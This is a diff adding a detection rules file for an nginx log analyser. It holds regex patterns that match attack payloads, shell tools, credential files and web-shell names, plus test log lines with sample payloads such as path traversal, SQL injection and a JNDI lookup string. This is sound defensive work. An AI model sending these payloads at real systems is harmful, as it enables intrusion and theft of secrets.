@@ -1,0 +1,270 @@
+# nginx access log rules (source = "nginx").
+#
+# Fields: ip, method, path (percent-decoded twice, lowercase, no query), query (decoded, lowercase),
+#         request (path?query), target (raw), status, bytes, host (lowercase), ua, referer,
+#         trusted ("true" if ip is in @trusted_networks)
+# Severity guide: critical = almost certainly a successful compromise/leak · high = likely successful,
+# needs a look today · medium = suspicious, review in the report · low = context.
+
+[patterns]
+# Exploit payloads. Kept loose on purpose: on its own a hit is just an attempt; rules combine it
+# with the response status to judge success.
+web_attack = '''\.\./|\.\.\\|/etc/(?:passwd|shadow|group|hosts)\b|/proc/self/(?:environ|cmdline|fd)|\bwin\.ini\b|\bboot\.ini\b|\bunion\b[\s/*+]+(?:all[\s/*+]+)?select\b|\b(?:sleep|benchmark|pg_sleep)\s*\(\s*\d|\bwaitfor\s+delay\b|'\s*or\s*'?\d'?\s*=\s*'?\d|\bor\s+1\s*=\s*1\b|<script|javascript:|\bon(?:error|load)\s*=|\$\{jndi:|\$\{\$\{|php://|data://text|expect://|\ballow_url_include\b|\bauto_prepend_file\b|\bbase64_decode\s*\(|\b(?:eval|assert|system|passthru|shell_exec|popen|proc_open)\s*\(|;\s*(?:wget|curl|sh|bash|nc|busybox|chmod)\b|\|\s*(?:sh|bash)\b|\$\((?:wget|curl|id|whoami|cat|uname)\b|`(?:id|whoami|wget|curl|uname)\b|\(\)\s*\{\s*:\s*;\s*\}\s*;|%\{\(#|\bxdebug_session_start\b|\binvokefunction\b|\bcall_user_func_array\b'''
+
+# Files that must never be served with content.
+secret_file = '''/\.env(?:\.[\w.-]+)?$|/\.git/|/\.git-credentials$|/\.svn/|/\.hg/|/\.ssh/|/id_(?:rsa|dsa|ecdsa|ed25519)$|/\.aws/|/\.htpasswd$|/\.npmrc$|/\.pypirc$|/\.docker/config\.json$|/\.kube/config$|/wp-config\.php[.~_-]|/config\.php\.(?:bak|old|save|swp|orig)$|/phpinfo\.php$|/server-status$|/\.ds_store$|/credentials(?:\.json)?$|/secrets?\.(?:ya?ml|json|txt)$|/\.bash_history$|/\.mysql_history$'''
+
+backup_file = '''\.(?:sql|sql\.gz|sql\.zst|sql\.bz2|sqlite3?|db|bak|backup|old|orig|save|swp|tar|tar\.gz|tgz|zip|7z|rar|dump)$'''
+
+webshell = '''^/wp-content/uploads/.*\.(?:php\d?|phtml|phar|pht|inc)$|/(?:shell|cmd|wso\d*|c99|r57|alfa\w*|b374k|mini|marijuana|indoxploit|priv8|leaf|wp-shell|uploader|xleet|lufix|bypass|gecko|chosen|f0x|haxor|webadmin|fm|filemanager|adminer)\.php$'''
+
+# ---------------------------------------------------------------------------------------
+# Successful attacks / leaks
+# ---------------------------------------------------------------------------------------
+
+[[rule]]
+id = "nginx.secret_exposed"
+source = "nginx"
+severity = "critical"
+title = "Sensitive file served: {host}{path} ({status}, {bytes} B)"
+description = "A secret-looking path was answered with 2xx and a body. Check what was served and rotate anything it contains."
+match = { status = "2xx", bytes = ">0", path = "{{secret_file}}" }
+where = { none = [ { path = ["@allowed_sensitive_paths"] } ] }
+aggregate = { group_by = ["host", "path"] }
+collect = ["ip"]
+soft404_check = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /.env HTTP/1.1" 200 812 "-" "curl/8" sn="etnur.com"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /backend/.env.production HTTP/1.1" 200 90 "-" "-" sn="etnur.com"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /%252e%2565nv HTTP/1.1" 200 90 "-" "-" sn="etnur.com"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /.git/config HTTP/1.1" 200 255 "-" "-" sn="etnur.net"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /.env HTTP/1.1" 404 3968 "-" "curl/8" sn="etnur.com"'
+expect = false
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /.git/config HTTP/1.1" 444 0 "-" "-" sn="gaylynmorgan.com"'
+expect = false
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /environment HTTP/1.1" 200 90 "-" "-" sn="etnur.com"'
+expect = false
+
+[[rule]]
+id = "nginx.backup_exposed"
+source = "nginx"
+severity = "high"
+title = "Backup/dump file served: {host}{path} ({bytes} B)"
+description = "A database dump or archive was downloaded. Check whether it should be public."
+match = { status = "2xx", bytes = ">0", path = "{{backup_file}}" }
+where = { none = [ { path = ["@allowed_sensitive_paths"] } ] }
+aggregate = { group_by = ["host", "path"] }
+collect = ["ip"]
+soft404_check = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /database.sql HTTP/1.1" 200 81234 "-" "-" sn="etnur.net"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET /database.sql HTTP/1.1" 404 3968 "-" "-" sn="etnur.net"'
+expect = false
+
+[[rule]]
+id = "nginx.attack_success_path"
+source = "nginx"
+severity = "high"
+title = "Exploit payload in path answered {status}: {host}{path}"
+description = "The request path carried an exploit payload (traversal, injection, …) and the server answered 2xx with a body."
+match = { status = "2xx", bytes = ">0", path = "(?i){{web_attack}}" }
+aggregate = { group_by = ["host", "path"] }
+collect = ["ip"]
+soft404_check = true
+[[rule.test]]
+line = '136.70.68.146 - - [01/Oct/2026:11:20:17 +0200] "GET /api/w/starter/jobs_u/get_log_file/../../../../proc/self/environ HTTP/1.1" 200 3968 "-" "x" sn="gaylynmorgan.com"'
+expect = true
+[[rule.test]]
+line = '136.70.68.146 - - [01/Oct/2026:11:20:17 +0200] "GET /api/w/starter/jobs_u/get_log_file/../../../../proc/self/environ HTTP/1.1" 404 3968 "-" "x" sn="gaylynmorgan.com"'
+expect = false
+[[rule.test]]
+line = '136.70.68.146 - - [01/Oct/2026:11:20:16 +0200] "GET /api/uploads/%2e%2e%2f%2e%2e%2f.env HTTP/1.1" 200 10 "-" "x" sn="gaylynmorgan.com"'
+expect = true
+
+[[rule]]
+id = "nginx.attack_success_param"
+source = "nginx"
+severity = "medium"
+title = "Exploit payload in query answered {status}: {host}{path}"
+description = "Query parameters carried an exploit payload and the response was 2xx. Many apps ignore unknown parameters and answer 200 anyway, so this is a lead, not proof."
+match = { status = "2xx", bytes = ">0", query = "(?i){{web_attack}}" }
+aggregate = { group_by = ["host", "path"] }
+collect = ["ip", "query"]
+soft404_check = true
+[[rule.test]]
+line = '5.6.7.8 - - [01/Oct/2026:11:20:17 +0200] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array HTTP/1.1" 200 5000 "-" "x" sn="etnur.net"'
+expect = true
+[[rule.test]]
+line = '5.6.7.8 - - [01/Oct/2026:11:20:17 +0200] "GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 5000 "-" "x" sn="etnur.net"'
+expect = true
+[[rule.test]]
+line = '5.6.7.8 - - [01/Oct/2026:11:20:17 +0200] "GET /?s=union+select+password HTTP/1.1" 403 50 "-" "x" sn="etnur.net"'
+expect = false
+[[rule.test]]
+line = '5.6.7.8 - - [01/Oct/2026:11:20:17 +0200] "GET /search?q=garden+selection HTTP/1.1" 200 5000 "-" "x" sn="etnur.net"'
+expect = false
+
+[[rule]]
+id = "nginx.webshell"
+source = "nginx"
+severity = "high"
+title = "Possible web shell reached: {host}{path} ({method} {status})"
+description = "A PHP file in an upload directory, or one with a typical web shell name, was executed (2xx)."
+match = { status = "2xx", bytes = ">0", path = "{{webshell}}" }
+aggregate = { group_by = ["host", "path"] }
+collect = ["ip", "method"]
+soft404_check = true
+[[rule.test]]
+line = '9.9.9.9 - - [01/Oct/2026:10:00:00 +0200] "POST /wp-content/uploads/2026/09/x.php HTTP/1.1" 200 41 "-" "-" sn="yogamitselina.de"'
+expect = true
+[[rule.test]]
+line = '9.9.9.9 - - [01/Oct/2026:10:00:00 +0200] "GET /alfa-rex.php HTTP/1.1" 404 41 "-" "-" sn="yogamitselina.de"'
+expect = false
+[[rule.test]]
+line = '9.9.9.9 - - [01/Oct/2026:10:00:00 +0200] "GET /wp-content/uploads/2026/09/photo.jpg HTTP/1.1" 200 41000 "-" "-" sn="yogamitselina.de"'
+expect = false
+
+[[rule]]
+id = "nginx.wp_login_failed"
+source = "nginx"
+kind = "stat"
+title = "WordPress failed logins (POST wp-login.php → 200)"
+match = { method = ["POST"], path = '^/wp-login\.php$', status = "200" }
+aggregate = { group_by = ["ip"], threshold = 5 }
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "POST /wp-login.php HTTP/1.1" 200 5123 "-" "-" sn="etnur.net"'
+expect = true
+
+[[rule]]
+id = "nginx.wp_login_after_bruteforce"
+source = "nginx"
+severity = "critical"
+title = "WordPress login succeeded after brute force: {ip} on {host}"
+description = "POST /wp-login.php answered 302 (= successful login) from an IP that also failed ≥10 times in the window. Check the WP user list, sessions and recent changes; reset passwords."
+match = { method = ["POST"], path = '^/wp-login\.php$', status = "302" }
+where = { none = [ { query = 'action=' } ] }
+aggregate = { group_by = ["ip", "host"] }
+requires = { rule = "nginx.wp_login_failed", same = ["ip"], min_count = 10 }
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "POST /wp-login.php HTTP/1.1" 302 0 "-" "-" sn="etnur.net"'
+expect = true
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "POST /wp-login.php?action=lostpassword HTTP/1.1" 302 0 "-" "-" sn="etnur.net"'
+expect = false
+
+[[rule]]
+id = "nginx.wp_login"
+source = "nginx"
+kind = "stat"
+title = "WordPress logins (POST wp-login.php → 302)"
+match = { method = ["POST"], path = '^/wp-login\.php$', status = "302" }
+where = { none = [ { query = 'action=' } ] }
+aggregate = { group_by = ["host", "ip"] }
+
+[[rule]]
+id = "nginx.xmlrpc_bruteforce"
+source = "nginx"
+severity = "medium"
+title = "xmlrpc.php brute force from {ip} on {host} ({status})"
+description = "Many POSTs to xmlrpc.php answered 200. Success isn't visible in the access log; consider blocking xmlrpc.php."
+match = { method = ["POST"], path = '^/xmlrpc\.php$', status = "200" }
+aggregate = { group_by = ["ip", "host"], threshold = 20 }
+
+[[rule]]
+id = "nginx.vpn_only_reached"
+source = "nginx"
+severity = "high"
+title = "VPN-only vhost {host} answered {status} to outside IP {ip}"
+description = "A host that should only be reachable over the VPN served a non-error response to an untrusted address. Check the nginx listen/allow directives."
+match = { host = ["@vpn_only_hosts"], trusted = false, status = "<400" }
+aggregate = { group_by = ["host", "ip"] }
+collect = ["path"]
+[[rule.test]]
+line = '8.8.8.8 - - [01/Oct/2026:10:00:00 +0200] "GET / HTTP/1.1" 200 1000 "-" "-" sn="n8n.services.etnur.net"'
+expect = true
+[[rule.test]]
+line = '10.8.1.5 - - [01/Oct/2026:10:00:00 +0200] "GET / HTTP/1.1" 200 1000 "-" "-" sn="n8n.services.etnur.net"'
+expect = false
+[[rule.test]]
+line = '8.8.8.8 - - [01/Oct/2026:10:00:00 +0200] "GET / HTTP/1.1" 444 0 "-" "-" sn="n8n.services.etnur.net"'
+expect = false
+
+[[rule]]
+id = "nginx.write_from_outside"
+source = "nginx"
+severity = "medium"
+title = "{method} on {host} from outside IP {ip} ({status})"
+description = "A write request to a watched host (e.g. image push to the registry) came from outside the trusted networks."
+match = { host = ["@write_watch_hosts"], method = ["PUT", "POST", "PATCH", "DELETE"], status = "2xx", trusted = false }
+aggregate = { group_by = ["host", "ip", "method"] }
+collect = ["path"]
+[[rule.test]]
+line = '8.8.8.8 - - [01/Oct/2026:10:00:00 +0200] "PUT /v2/x/manifests/prod HTTP/1.1" 201 0 "-" "docker/27" sn="registry.etnur.net"'
+expect = true
+[[rule.test]]
+line = '10.8.1.5 - - [01/Oct/2026:10:00:00 +0200] "PUT /v2/x/manifests/prod HTTP/1.1" 201 0 "-" "docker/27" sn="registry.etnur.net"'
+expect = false
+
+[[rule]]
+id = "nginx.admin_new_source"
+source = "nginx"
+severity = "low"
+title = "First write to {host} from new IP {ip} in 90 days"
+description = "A POST/PUT that succeeded on an admin/app backend from an address not seen before. Usually you on a new network."
+match = { host = ["@admin_hosts"], method = ["POST", "PUT", "PATCH", "DELETE"], status = "2xx", trusted = false }
+aggregate = { group_by = ["host", "ip"] }
+new_value_of = "ip"
+
+[[rule]]
+id = "nginx.5xx_spike"
+source = "nginx"
+severity = "medium"
+title = "{host}: many 5xx responses"
+description = "Unusually many server errors on one vhost: a broken backend, or an exploit attempt crashing it."
+match = { status = "5xx" }
+aggregate = { group_by = ["host"], threshold = 200 }
+collect = ["path"]
+
+# ---------------------------------------------------------------------------------------
+# Stats (digest only)
+# ---------------------------------------------------------------------------------------
+
+[[rule]]
+id = "nginx.attack_attempt"
+source = "nginx"
+kind = "stat"
+title = "Exploit attempts that failed (by IP)"
+match = { status = { not_range = "2xx" } }
+where = { any = [ { request = "(?i){{web_attack}}" }, { ua = "(?i){{web_attack}}" } ] }
+aggregate = { group_by = ["ip"] }
+[[rule.test]]
+line = '1.2.3.4 - - [01/Oct/2026:10:00:00 +0200] "GET / HTTP/1.1" 403 0 "-" "${jndi:ldap://x/a}" sn="etnur.net"'
+expect = true
+
+[[rule]]
+id = "nginx.scanner_probe"
+source = "nginx"
+kind = "stat"
+title = "Scanners: requests answered 4xx/444 (by IP, ≥50)"
+match = { trusted = false, status = [ "400", "401", "403", "404", "405", "444" ] }
+aggregate = { group_by = ["ip"], threshold = 50 }
+
+[[rule]]
+id = "nginx.server_errors"
+source = "nginx"
+kind = "stat"
+title = "5xx responses (by host)"
+match = { status = "5xx" }
+aggregate = { group_by = ["host", "status"] }
